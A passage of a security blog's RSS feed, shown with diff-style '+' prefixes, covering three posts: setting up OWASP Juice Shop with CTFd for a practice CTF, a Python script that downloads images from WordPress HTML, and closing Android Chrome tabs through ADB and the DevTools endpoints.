+Feb 13 18:48:54 ip-172-x-x-x dockerd[2989]: time="2020-02-13T18:48:54.313436441Z" level=info msg="Loading 
+Feb 13 18:48:54 ip-172-x-x-x dockerd[2989]: time="2020-02-13T18:48:54.483095557Z" level=info msg="Default 
+Feb 13 18:48:54 ip-172-x-x-x dockerd[2989]: time="2020-02-13T18:48:54.601472072Z" level=info msg="Loading 
+Feb 13 18:48:54 ip-172-x-x-x dockerd[2989]: time="2020-02-13T18:48:54.645443147Z" level=info msg="Docker d
+Feb 13 18:48:54 ip-172-x-x-x dockerd[2989]: time="2020-02-13T18:48:54.645763489Z" level=info msg="Daemon h
+Feb 13 18:48:54 ip-172-x-x-x systemd[1]: Started Docker Application Container Engine.
+Feb 13 18:48:54 ip-172-x-x-x dockerd[2989]: time="2020-02-13T18:48:54.722256553Z" level=info msg="API list
+</pre>
+<p>With Docker running, I grabbed the Juice Shop image.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo docker pull bkimminich/juice-shop
+Using default tag: latest
+latest: Pulling from bkimminich/juice-shop
+c9b1b535fdd9: Pull complete 
+32eb17722c57: Pull complete 
+c6a4a31e8940: Pull complete 
+3f01d5292e29: Pull complete 
+9c9e52c1b57b: Pull complete 
+1ca529479291: Pull complete 
+919fac11c0d7: Pull complete 
+d989e0d66366: Pull complete 
+Digest: sha256:d9c1a537f416ee0b163df906184cb836c7ae38861dc48c5f0c4289efe955ae26
+Status: Downloaded newer image for bkimminich/juice-shop:latest
+docker.io/bkimminich/juice-shop:latest
+</pre>
+<p>Next, I ran the image with the basic command, to ensure that it was working.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo docker run --rm -p 3000:3000 bkimminich/juice-shop
+
+&gt; juice-shop@9.3.1 start /juice-shop
+&gt; node app
+
+info: All dependencies in ./package.json are satisfied (OK)
+info: Detected Node.js version v12.14.1 (OK)
+info: Detected OS linux (OK)
+info: Detected CPU x64 (OK)
+info: Required file index.html is present (OK)
+info: Required file styles.css is present (OK)
+info: Required file main-es2015.js is present (OK)
+info: Required file tutorial-es2015.js is present (OK)
+info: Required file polyfills-es2015.js is present (OK)
+info: Required file runtime-es2015.js is present (OK)
+info: Required file vendor-es2015.js is present (OK)
+info: Required file main-es5.js is present (OK)
+info: Required file tutorial-es5.js is present (OK)
+info: Required file polyfills-es5.js is present (OK)
+info: Required file runtime-es5.js is present (OK)
+info: Required file vendor-es5.js is present (OK)
+info: Configuration default validated (OK)
+info: Port 3000 is available (OK)
+info: Server listening on port 3000
+</pre>
+<h2>OWASP Juice Shop - Connection Issues</h2>
+<p>Unfortunately, I was unable to connect to the server on port 3000, as there were connection issues.</p>
+<p>First, I verified that the service was listening on the right port.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo netstat -tulpn | grep LISTEN
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      606/systemd-resolve 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      953/sshd            
+tcp6       0      0 :::22                   :::*                    LISTEN      953/sshd            
+tcp6       0      0 :::3000                 :::*                    LISTEN      4211/docker-proxy   
+</pre>
+<p>I thought this might be an issue related to IPv6, so I disabled it everywhere.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
+net.ipv6.conf.all.disable_ipv6 = 1
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1
+net.ipv6.conf.default.disable_ipv6 = 1
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1
+net.ipv6.conf.lo.disable_ipv6 = 1
+</pre>
+<p>After also adding these flags to the proper configs, I also restarted my server.</p>
+<p>I was still running into some issues, so I also enabled IPv4 IP forwarding.</p>
+<pre class="console">
+net.ipv4.ip_forward = 1
+</pre>
+<p>None of these changes allowed me to reach port 3000, so I reached out to my local AWS expert. As it turns out, EC2 blocks all ports other than 22 by default, so I had to add the proper Security Group and permissions.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-5-securityGroup.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-5-securityGroup.png" alt="Security Groups" width="994" height="527" class="alignnone size-full wp-image-4950" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-5-securityGroup.png 994w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-5-securityGroup-300x159.png 300w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-5-securityGroup-768x407.png 768w" sizes="(max-width: 994px) 100vw, 994px" /></a></p>
+<p>Obviously, this worked, and I was able to connect to the Juice Shop web interface!</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juIceShop-6-running.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juIceShop-6-running.png" alt="Juice Shop running" width="950" height="543" class="alignnone size-full wp-image-4951" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juIceShop-6-running.png 950w, https://www.doyler.net/wp-content/uploads/juiceShop/juIceShop-6-running-300x171.png 300w, https://www.doyler.net/wp-content/uploads/juiceShop/juIceShop-6-running-768x439.png 768w" sizes="(max-width: 950px) 100vw, 950px" /></a></p>
+<p>Before moving on, I also set my container to run as a daemon, so that I could have it in the background.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo docker run --rm -d -p 3000:3000 bkimminich/juice-shop
+e7f104933039873ead5457017c4e56b83336737b8b416b5585afb70d795bc62f
+</pre>
+<h2>Juice Shop CLI</h2>
+<p>The <a href="https://www.npmjs.com/package/juice-shop-ctf-cli">juice-shop-ctf-cli</a> package helps to prepare the environment for a CTF, so that was next on my list.</p>
+<p>First, I installed npm on my server.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo apt-get install npm
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+</pre>
+<p>Next, I installed the cli package.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo npm install -g juice-shop-ctf-cli
+npm WARN deprecated request@2.88.2: request has been deprecated, see https://github.com/request/request/issues/3142
+npm WARN deprecated left-pad@1.3.0: use String.prototype.padStart()
+/usr/local/bin/juice-shop-ctf -&gt; /usr/local/lib/node_modules/juice-shop-ctf-cli/bin/juice-shop-ctf.js
+/usr/local/lib
+└─┬ juice-shop-ctf-cli@7.0.0 
+</pre>
+<p>Before running the juice-shop-ctf tool, I also generated a secret key to use for the flags.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ date +%s | sha256sum | base64 | head -c 32 ; echo
+Mxxx2
+</pre>
+<p>With everything configured, it was time to generate my CTFd backup archive.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ juice-shop-ctf
+
+Generate OWASP Juice Shop challenge archive for setting up CTFd, FBCTF or RootTheBox score server
+? CTF framework to generate data for? CTFd
+? Juice Shop URL to retrieve challenges? http://ec2-xxx.compute.amazonaws.com:3000/
+? Secret key <or> URL to ctf.key file? Mxxx2
+? Insert a text hint along with each challenge? Free text hints
+? Insert a hint URL along with each challenge? Free hint URLs
+
+Backup archive written to /home/ubuntu/OWASP_Juice_Shop.2020-02-13.CTFd.zip
+
+After the import you will have to set up the CTF name and administrator credentials again!
+
+For a step-by-step guide to import the ZIP-archive into CTFd, please refer to
+https://pwning.owasp-juice.shop/part1/ctf.html#running-ctfd
+</pre>
+<p>Before moving on, I also <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html">setup my environment variables</a> and reran my container.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo docker run --rm -d -e "CTF_KEY=Mxxx2" -e "NODE_ENV=ctf" -p 3000:3000 bkimminich/juice-shop
+ed6c95d6fb615897da5f7bf7f25eac0887da042ee93fb3b447fa7ff556ffaf5f
+</pre>
+<h2>CTFd Installation and Configuration</h2>
+<p>Before installing CTFd, I needed to setup <a href="https://docs.docker.com/compose/install/">Docker Compose</a>.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo curl -L "https://github.com/docker/compose/releases/download/1.25.3/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   617  100   617    0     0   3505      0 --:--:-- --:--:-- --:--:--  3505
+100 16.4M  100 16.4M    0     0  13.2M      0  0:00:01  0:00:01 --:--:-- 17.4M
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo chmod +x /usr/local/bin/docker-compose
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ docker-compose --version
+docker-compose version 1.25.3, build d4d1b42b
+</pre>
+<p>For more information on the CTFd setup, you can read the following <a href="https://github.com/CTFd/CTFd/wiki/Basic-Deployment">wiki page</a>.</p>
+<p>First, I setup a random CTFd_secret_key.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~/CTFd</span>$ python -c "import os; f=open('.ctfd_secret_key', 'a+'); f.write(os.urandom(64)); f.close()"
+</pre>
+<p>Next, I ran the docker-compose up command to stand up the environment.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~/CTFd</span>$ docker-compose up
+ERROR: Couldn't connect to Docker daemon at http+docker://localhost - is it running?
+
+If it's at a non-standard location, specify the URL with the DOCKER_HOST environment variable.
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~/CTFd</span>$ sudo docker-compose up
+Creating network "ctfd_internal" with the default driver
+Creating network "ctfd_default" with the default driver
+Pulling db (mariadb:10.4)...
+10.4: Pulling from library/mariadb
+5c939e3a4d10: Pull complete
+
+... &lt;snip&gt; ...
+</pre>
+<p>This took quite a while, but I also ran it in daemon mode once it finished.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~/CTFd</span>$ sudo docker-compose up -d
+Building ctfd
+Step 1/15 : FROM python:3.7-alpine
+ ---&gt; a5d195bb2a63
+Step 2/15 : RUN apk update &&     apk add python python-dev linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev
+ ---&gt; Using cache
+ ---&gt; 6c8cc986fd5c
+Step 3/15 : RUN adduser -D -u 1001 -s /bin/bash ctfd
+ ---&gt; Using cache
+
+... &lt;snip&gt; ...
+
+WARNING: Image for service ctfd was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.
+Pulling cache (redis:4)...
+4: Pulling from library/redis
+bc51dd8edc1b: Pull complete
+37d80eb324ee: Pull complete
+392b7748dfaf: Pull complete
+74c85bb8b632: Pull complete
+65aba7f17311: Pull complete
+d2987ccbb89f: Pull complete
+Digest: sha256:b47838c3ab42d810741bfc59d63d02b825c0d52e1dbe9a5d76385e3cbf8395b8
+Status: Downloaded newer image for redis:4
+Creating ctfd_cache_1 ... done
+Creating ctfd_db_1    ... done
+Creating ctfd_ctfd_1  ... done
+</pre>
+<p>With the installation complete, I verified that CTFd was listening on port 8000 as expected.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~/CTFd</span>$ netstat -tulpn | grep LISTEN
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
+tcp6       0      0 :::8000                 :::*                    LISTEN      -                   
+</pre>
+<p>When I went to port 8000 in my browser, I saw the CTFd setup pages.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-7-CTFsetup.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-7-CTFsetup-1024x422.png" alt="OWASP Juice Shop - CTFd setup" width="500" height="206" class="alignnone size-large wp-image-4954" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-7-CTFsetup-1024x422.png 1024w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-7-CTFsetup-300x124.png 300w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-7-CTFsetup-768x317.png 768w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-7-CTFsetup-1536x634.png 1536w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-7-CTFsetup-2048x845.png 2048w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>After the initial configuration, I went to the Backup -&gt; Import page, so that I could add my Juice Shop flags.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-8-importCTF.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-8-importCTF-1024x525.png" alt="Import CTF" width="500" height="256" class="alignnone size-large wp-image-4955" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-8-importCTF-1024x525.png 1024w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-8-importCTF-300x154.png 300w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-8-importCTF-768x394.png 768w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-8-importCTF-1536x787.png 1536w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-8-importCTF-2048x1050.png 2048w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>Before I could select my file, I had to upload the zip file from earlier to my EC2 instance.</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/JuiceShop#</span> scp -i juiceshop-keypair.pem ubuntu@ec2-xxx.compute.amazonaws.com:/home/ubuntu/OWASP_Juice_Shop.2020-02-13.CTFd.zip .
+OWASP_Juice_Shop.2020-02-13.CTFd.zip                                          100%   15KB  52.3KB/s   00:00    
+</pre>
+<p>When the archive was on my EC2 host, I could select it as my import file.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-9-ctfFile.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-9-ctfFile.png" alt="File selected" width="828" height="262" class="alignnone size-full wp-image-4956" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-9-ctfFile.png 828w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-9-ctfFile-300x95.png 300w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-9-ctfFile-768x243.png 768w" sizes="(max-width: 828px) 100vw, 828px" /></a></p>
+<p>After the import, all the challenges (and flags) were pre-populated!</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-10-configured.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-10-configured-1024x665.png" alt="OWASP Juice Shop - Challenges populated" width="500" height="325" class="alignnone size-large wp-image-4957" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-10-configured-1024x665.png 1024w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-10-configured-300x195.png 300w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-10-configured-768x499.png 768w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-10-configured-1536x998.png 1536w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-10-configured-2048x1330.png 2048w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>To test everything, I captured the 100-point DOM XSS flag.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-11-flagCaptured.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-11-flagCaptured.png" alt="Flag captured" width="624" height="364" class="alignnone size-full wp-image-4952" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-11-flagCaptured.png 624w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-11-flagCaptured-300x175.png 300w" sizes="(max-width: 624px) 100vw, 624px" /></a></p>
+<p>As you can see, I am the only team on the scoreboard, and everything is working as expected.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-12-scoreboard.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-12-scoreboard-1024x480.png" alt="Scoreboard" width="500" height="234" class="alignnone size-large wp-image-4953" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-12-scoreboard-1024x480.png 1024w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-12-scoreboard-300x141.png 300w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-12-scoreboard-768x360.png 768w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-12-scoreboard-1536x720.png 1536w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-12-scoreboard-2048x960.png 2048w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<h2>OWASP Juice Shop - Conclusion</h2>
+<p>This was surprisingly simple to get running, and I'm looking forward to using it alongside some training.</p>
+<p>The only real downside is that there are write-ups for everything online. That said, this still functions great for an introduction to web application testing as well as CTFs.</p>
+<p>I may investigate posting some write-ups for Juice Shop here as well, so stay tuned!</p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/owasp-juice-shop-ctfd">OWASP Juice Shop + CTFd = Easy DIY CTFs!</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.doyler.net/security-not-included/owasp-juice-shop-ctfd/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">4918</post-id>	</item>
+		<item>
+		<title>Download Images from HTML &#8211; Including WordPress Posts</title>
+		<link>https://www.doyler.net/security-not-included/download-images-from-html</link>
+					<comments>https://www.doyler.net/security-not-included/download-images-from-html#respond</comments>
+		
+		<dc:creator><![CDATA[doyler]]></dc:creator>
+		<pubDate>Sat, 22 Feb 2020 17:00:27 +0000</pubDate>
+				<category><![CDATA[Security Not Included]]></category>
+		<guid isPermaLink="false">https://www.doyler.net/?p=4869</guid>
+
+					<description><![CDATA[<p>I recently wanted to download images from HTML, and I wanted to share the script that I wrote for this. Download Images from HTML - Introduction I had some WordPress posts that I wanted to backup, but I wanted to &#8230; <a href="https://www.doyler.net/security-not-included/download-images-from-html">Continue reading <span class="meta-nav">&#8594;</span></a></p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/download-images-from-html">Download Images from HTML &#8211; Including WordPress Posts</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I recently wanted to download images from HTML, and I wanted to share the script that I wrote for this.</p>
+<p><span id="more-4869"></span></p>
+<h2>Download Images from HTML - Introduction</h2>
+<p>I had some WordPress posts that I wanted to backup, but I wanted to make sure that I had the text as well as the images.</p>
+<p>This was a simple script, but it solved a problem that I had had recently. That said, I could see myself using this or an updated version for some OSINT or phishing in the future.</p>
+<p>This will be another short script like my <a href="https://www.doyler.net/security-not-included/close-android-chrome-tabs">last post</a>, but I've been automating some small problems as of late!</p>
+<h2>Parsing the HTML</h2>
+<p>First, I tried to just use <a href="https://regex101.com/">regex</a> to parse out any img src attributes from my flat text file.</p>
+<p>As I should have expected, and this <a href="https://stackoverflow.com/a/1732454">Stack Overflow answer</a> has warned, this proved to be annoying at best.</p>
+<p>That said, I ended up using <a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/">Beautiful Soup</a> to parse the file and extract the links that I wanted. Then, I downloaded the images, and saved them locally.</p>
+<p>Note that I was using a flat text file with multiple WordPress posts, but this process should work fine for any HTML document that you are interacting with.</p>
+<h2>The Code</h2>
+<p>You can find the code for this process below. Note that there is also a small loop with some regex in the middle of the script. This is to download the original image files from WordPress, as opposed to the resized versions. You should not see any adverse effects from this section, if your files do not end in what looks like a resolution (i.e.: -300x400.jpg).</p>
+<p>Also, I'm sure that <a href="https://twitter.com/recviking">RecViking</a> is proud of me for finally using some regex again.</p>
+<pre class="prettyprint">
+import bs4
+import re
+import requests
+import shutil
+import sys
+from urllib import urlopen
+
+links = []
+origLinks = []
+
+# https://stackoverflow.com/questions/18042661/using-bs4-to-extract-text-in-html-files
+page = urlopen('posts.txt').read().decode('utf-8')
+soup = bs4.BeautifulSoup(page, "html.parser")
+for node in soup.findAll('img'):
+    #print(node['src'])
+    links.append(node['src'])
+
+# https://docs.python.org/3.4/library/re.html
+for link in links:
+    if re.search("-[0-9]*x[0-9]*\.jpg", link):
+        origLinks.append(re.sub("-[0-9]*x[0-9]*\.jpg", ".jpg", link))
+    else:
+        origLinks.append(link)
+
+# https://www.dev2qa.com/how-to-download-image-file-from-url-use-python-requests-or-wget-module/
+for link in origLinks:
+    filename = ""
+    if link.find('/'):
+        filename = link.rsplit('/', 1)[1]
+
+    resp = requests.get(link, stream=True)
+    localFile = open(filename, 'wb')
+    resp.raw.decode_content = True
+    shutil.copyfileobj(resp.raw, localFile)
+    del resp
+</pre>
+<p>When I executed this script, it downloaded all my images as expected!</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/Documents/imgExtract</span># ls
+imgExtract.py  posts.txt
+<span class="prompt">root@kali</span>:<span class="dir">~/Documents/imgExtract</span># python imgExtract.py 
+<span class="prompt">root@kali</span>:<span class="dir">~/Documents/imgExtract</span># ls *.jpg
+13177978_10206776407554475_5913650144102677662_n.jpg  IMG_1951.jpg
+IMG_1119.jpg                                          IMG_1952.jpg
+IMG_1120.jpg                                          IMG_1953.jpg
+IMG_1136.jpg                                          IMG_1954.jpg
+IMG_1195.jpg                                          IMG_2151-e1468181469199.jpg
+IMG_1237.jpg                                          IMG_2160.jpg
+IMG_1238.jpg                                          IMG_2161-e1468181539638.jpg
+IMG_1245.jpg                                          IMG_2163.jpg
+IMG_1247.jpg                                          IMG_2210-e1468181566583.jpg
+IMG_1270.jpg                                          IMG_2418-e1468183375745.jpg
+IMG_1271.jpg                                          IMG_2426.jpg
+IMG_1934.jpg                                          IMG_2427.jpg
+IMG_1936.jpg                                          IMG_2429-e1468183409990.jpg
+IMG_1948.jpg
+</pre>
+<p>As usual, you can find the code and any updates in my <a href="https://github.com/doyler/SecurityTools/tree/master/ImageExtract">GitHub repository</a>.</p>
+<p>Please feel free to submit any pull requests, if you use this for anything else, especially offensive related.</p>
+<h2>Download Images from HTML - Conclusion</h2>
+<p>This was a simpler script, but it solved a problem that I was having.</p>
+<p>I'm not sure if it qualifies as a "security" tool, but I could see a few uses for it here and there.</p>
+<p>I also found some older <a href="https://twitter.com/EverSecCTF/">EverSec</a> challenges, so I'm hoping to go through them soon and see if any are worth blogging about.</p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/download-images-from-html">Download Images from HTML &#8211; Including WordPress Posts</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.doyler.net/security-not-included/download-images-from-html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">4869</post-id>	</item>
+		<item>
+		<title>Close Android Chrome Tabs &#8211; Now With Automation</title>
+		<link>https://www.doyler.net/security-not-included/close-android-chrome-tabs</link>
+					<comments>https://www.doyler.net/security-not-included/close-android-chrome-tabs#respond</comments>
+		
+		<dc:creator><![CDATA[doyler]]></dc:creator>
+		<pubDate>Sat, 15 Feb 2020 17:00:09 +0000</pubDate>
+				<category><![CDATA[Security Not Included]]></category>
+		<guid isPermaLink="false">https://www.doyler.net/?p=4871</guid>
+
+					<description><![CDATA[<p>I wanted a way to close Android Chrome tabs, and now I have it. Close Android Chrome Tabs - Introduction First of all, I wanted to wish everyone a Belated Happy Valentine's day! If you read my last post about &#8230; <a href="https://www.doyler.net/security-not-included/close-android-chrome-tabs">Continue reading <span class="meta-nav">&#8594;</span></a></p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/close-android-chrome-tabs">Close Android Chrome Tabs &#8211; Now With Automation</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I wanted a way to close Android Chrome tabs, and now I have it.</p>
+<p><span id="more-4871"></span></p>
+<h2>Close Android Chrome Tabs - Introduction</h2>
+<p>First of all, I wanted to wish everyone a Belated Happy Valentine's day!</p>
+<p>If you read my <a href="https://www.doyler.net/security-not-included/extract-android-chrome-tabs">last post</a> about interacting with Android Chrome tabs, then you have an idea of where this one may be going.</p>
+<p>First, I wanted to note that the code on that post was out-of-date, and I've provided the updates below (and updated the original post).</p>
+<pre class="prettyprint">
+tabs = Array.from(document.querySelector('div /deep/ div /deep/ div /deep/ div /deep/ div /deep/ div /deep/ div.vbox.flex-auto').shadowRoot.querySelectorAll('.devices-view .device-page-list .vbox'), s =&gt; ({name: s.querySelector('.device-page-title').textContent, url: s.querySelector('.device-page-url .devtools-link').getAttribute('href')}))
+str = '';
+for (i = 0; i &lt; tabs.length; i++){
+    if (tabs[i].name != null){
+      str += '- [' + tabs[i].name + '](' + tabs[i].url + ')\n'
+    } else {
+      console.log(tabs[i])
+    }
+}
+copy(str)
+</pre>
+<p>That said, I received a great <a href="https://www.doyler.net/security-not-included/extract-android-chrome-tabs#comment-45943">comment</a> asking how to close these tabs as well.</p>
+<p>After a lot of research and testing, I was finally able to figure this out. I'll walk through the manual process, as well as provide a short script to automate it at the end.</p>
+<h2>Pre-requisites</h2>
+<p>First, you will need <a href="https://developer.android.com/studio/releases/platform-tools.html">ADB installed</a> on your local system.</p>
+<p>Once you have ADB installed and running, you can verify the connection after enabling USB debugging.</p>
+<pre class="console">
+C:\Users\Ray&gt;adb devices
+* daemon not running; starting now at tcp:5037
+* daemon started successfully
+List of devices attached
+70xxxxxxxxxxxx  unauthorized
+</pre>
+<p>Next, create a local port forwarding rule from a port to the chrome_devtools_remote on the target device.</p>
+<pre class="console">
+C:\Users\Ray&gt;adb forward tcp:9222 localabstract:chrome_devtools_remote
+9222
+</pre>
+<h2>Close Android Chrome Tabs - Research and Closing Tabs</h2>
+<p>During some of my searches, I came across <a href="https://dev.to/piczmar_0/when-you-never-close-tabs-on-your-mobile-chrome-browser-2boj">this post</a> that mentioned the port forwarding and the /json Chrome endpoints.</p>
+<p>First, I went to <a href="http://localhost:9222/json/version">http://localhost:9222/json/version</a> to ensure that my forwarding worked.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-1-version.png"><img src="https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-1-version-1024x181.png" alt="Close Android Chrome Tabs - Version" width="500" height="88" class="alignnone size-large wp-image-4886" srcset="https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-1-version-1024x181.png 1024w, https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-1-version-300x53.png 300w, https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-1-version-768x136.png 768w, https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-1-version.png 1036w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>With that working, I also went to the <a href="http://localhost:9222/json/list">http://localhost:9222/json/list</a> endpoint, to get a list of my tabs.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-2-list.png"><img src="https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-2-list-1024x171.png" alt="Close Android Chrome Tabs - List" width="500" height="83" class="alignnone size-large wp-image-4885" srcset="https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-2-list-1024x171.png 1024w, https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-2-list-300x50.png 300w, https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-2-list-768x128.png 768w, https://www.doyler.net/wp-content/uploads/closeAndroidTabs/closeAndroidTabs-2-list.png 1470w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>Note that this is also another way to extract every tab from the device, as opposed to the DevTools and JavaScript method.</p>
+<h2>Closing the Tabs</h2>
+<p>The JSON endpoint was something that I was hoping to use to close my tabs, but couldn't get it working initially. For more information, I recommend the following posts that I spent some time on.</p>
+<ul>
+<li><a href="https://groups.google.com/forum/#!topic/google-chrome-developer-tools/0jGK_g3KZcQ">https://groups.google.com/forum/#!topic/google-chrome-developer-tools/0jGK_g3KZcQ</a></li>
+<li><a href="https://chromedevtools.github.io/devtools-protocol/#endpoints">https://chromedevtools.github.io/devtools-protocol/#endpoints</a></li>
+</ul>
+<p>First, I picked one of my <a href="https://www.mrmoneymustache.com/2016/02/10/should-you-do-your-own-taxes">tabs</a> that I wanted to close, and wrote down the id.</p>
+<pre class="console">
+[ {
+   "description": "",
